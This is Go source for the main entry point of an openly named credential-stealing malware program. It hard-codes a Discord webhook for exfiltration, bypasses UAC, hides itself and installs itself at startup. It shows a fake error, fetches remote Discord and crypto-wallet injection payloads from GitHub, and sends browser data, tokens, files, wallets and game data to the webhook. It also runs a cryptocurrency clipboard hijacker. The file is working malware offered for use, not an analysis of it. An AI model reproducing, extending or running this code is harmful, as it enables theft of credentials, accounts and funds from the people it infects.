package main

import (
	"github.com/CoomedOnPeppy/Stealer/modules/browsers"
	"github.com/CoomedOnPeppy/Stealer/modules/clipper"
	"github.com/CoomedOnPeppy/Stealer/modules/commonfiles"
	"github.com/CoomedOnPeppy/Stealer/modules/discodes"
	"github.com/CoomedOnPeppy/Stealer/modules/discordinjection"
	"github.com/CoomedOnPeppy/Stealer/modules/fakeerror"
	"github.com/CoomedOnPeppy/Stealer/modules/games"
	"github.com/CoomedOnPeppy/Stealer/modules/hideconsole"
	"github.com/CoomedOnPeppy/Stealer/modules/startup"
	"github.com/CoomedOnPeppy/Stealer/modules/system"
	"github.com/CoomedOnPeppy/Stealer/modules/tokens"
	"github.com/CoomedOnPeppy/Stealer/modules/uacbypass"
	"github.com/CoomedOnPeppy/Stealer/modules/wallets"
	"github.com/CoomedOnPeppy/Stealer/modules/walletsinjection"
	"github.com/CoomedOnPeppy/Stealer/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "https://discord.com/api/webhooks/1340428388313202770/jsgOdHMVdClcnv_kkJw6lKSEAHtWzcmmXoOlAYdEbiNQUwgdnYe1ho4KVkCgFOGWOJOA",
		"cryptos": map[string]string{
			"BTC": "",
			"BCH": "",
			"ETH": "",
			"XMR": "",
			"LTC": "",
			"XCH": "",
			"XLM": "",
			"TRX": "",
			"ADA": "",
			"DASH": "",
			"DOGE": "",
		},
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	go discordinjection.Run(
		"https://raw.githubusercontent.com/CoomedOnPeppy/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://github.com/CoomedOnPeppy/wallets-injection/wallets-injection/raw/main/atomic.asar",
		"https://github.com/CoomedOnPeppy/wallets-injection/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
